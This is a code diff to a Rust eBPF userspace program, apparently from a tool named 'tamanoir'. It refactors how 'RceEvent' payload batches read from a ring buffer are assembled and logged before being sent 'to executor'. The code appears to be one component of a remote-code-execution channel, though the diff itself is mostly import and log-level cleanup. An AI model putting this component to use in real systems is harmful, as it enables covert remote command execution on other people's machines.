@@ -8,8 +8,10 @@ use aya::{
 use clap::Parser;
 use log::{debug, info, warn};
 use mio::{unix::SourceFd, Events, Interest, Poll, Token};
-use tamanoir::ringbuf::{ContinuationByte, RceEvent, RingBuffer};
+use tamanoir::ringbuf::RingBuffer;
+use tamanoir_common::{ContinuationByte, RceEvent};
 use tokio::signal;
+
 #[derive(Debug, Parser)]
 struct Opt {
     #[clap(short, long, default_value = "wlan0")]
@@ -103,30 +105,23 @@ async fn main() -> anyhow::Result<()> {
                             let rce = rce.as_ptr() as *const RceEvent;
                             let rce = unsafe { *rce };
                             if rce.is_first_batch {
-                                info!("payload batch transmission start");
+                                debug!("payload batch transmission start");
                                 if let ContinuationByte::Reset | ContinuationByte::ResetEnd =
                                     rce.event_type
                                 {
-                                    info!("CLEAR PAYLOAD");
+                                    debug!("clear payload");
                                     payload.clear()
                                 }
                             }
-                            if let ContinuationByte::Reset | ContinuationByte::ResetEnd =
-                                rce.event_type
-                            {
-                                if rce.is_first_batch {
-                                    info!("CLEAR PAYLOAD");
-                                    payload.clear()
-                                }
-                            }
+
                             payload.extend_from_slice(rce.payload());
                             info!("PAYLOAD IS NOW {} bytes long ", payload.len());
                             if rce.is_last_batch {
-                                info!("payload batch transmission is finished!");
+                                debug!("payload batch transmission is finished!");
                                 if let ContinuationByte::End | ContinuationByte::ResetEnd =
                                     rce.event_type
                                 {
-                                    info!("payload full transmission is finished!");
+                                    debug!("payload full transmission is finished, sending it to executor");
                                     let str_payload = str::from_utf8(&payload).unwrap();
                                     info!("PAYLOAD: {}", str_payload);
                                 }
